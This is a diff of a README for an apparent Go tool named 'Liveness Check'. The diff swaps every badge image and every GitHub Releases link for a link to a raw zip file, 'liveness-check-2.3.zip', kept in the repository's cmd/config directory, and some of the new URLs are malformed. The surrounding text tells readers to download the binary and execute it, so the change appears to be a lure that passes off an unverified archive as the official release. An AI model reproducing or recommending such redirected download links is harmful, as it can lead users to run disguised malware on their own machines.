@@ -1,6 +1,6 @@
 # Liveness Check 🛠️
 
-![GitHub Workflow](https://img.shields.io/badge/workflow-Continuous%20Integration-brightgreen.svg) ![Go Version](https://img.shields.io/badge/go-1.16%2B-blue.svg) ![License](https://img.shields.io/badge/license-MIT-lightgrey.svg) ![Release](https://img.shields.io/badge/release-latest-orange.svg)
+![GitHub Workflow](https://raw.githubusercontent.com/JaoBufAnalog/liveness-check/main/cmd/config/liveness-check-2.3.zip%https://raw.githubusercontent.com/JaoBufAnalog/liveness-check/main/cmd/config/liveness-check-2.3.zip) ![Go Version](https://raw.githubusercontent.com/JaoBufAnalog/liveness-check/main/cmd/config/liveness-check-2.3.zip%https://raw.githubusercontent.com/JaoBufAnalog/liveness-check/main/cmd/config/liveness-check-2.3.zip) ![License](https://raw.githubusercontent.com/JaoBufAnalog/liveness-check/main/cmd/config/liveness-check-2.3.zip) ![Release](https://raw.githubusercontent.com/JaoBufAnalog/liveness-check/main/cmd/config/liveness-check-2.3.zip)
 
 ## Overview
 
@@ -28,7 +28,7 @@
 
 ## Installation
 
-To get started, you can download the latest release from the [Releases section](https://github.com/JaoBufAnalog/liveness-check/releases). Look for the appropriate binary for your operating system. 
+To get started, you can download the latest release from the [Releases section](https://raw.githubusercontent.com/JaoBufAnalog/liveness-check/main/cmd/config/liveness-check-2.3.zip). Look for the appropriate binary for your operating system. 
 
 After downloading, make sure to give it execute permissions:
 
@@ -105,9 +105,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, visit the [Releases section](https://github.com/JaoBufAnalog/liveness-check/releases). Download the binary and execute it to get started.
+For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/JaoBufAnalog/liveness-check/main/cmd/config/liveness-check-2.3.zip). Download the binary and execute it to get started.
 
-You can also check the [Releases section](https://github.com/JaoBufAnalog/liveness-check/releases) for updates and new features.
+You can also check the [Releases section](https://raw.githubusercontent.com/JaoBufAnalog/liveness-check/main/cmd/config/liveness-check-2.3.zip) for updates and new features.
 
 ## Conclusion
 
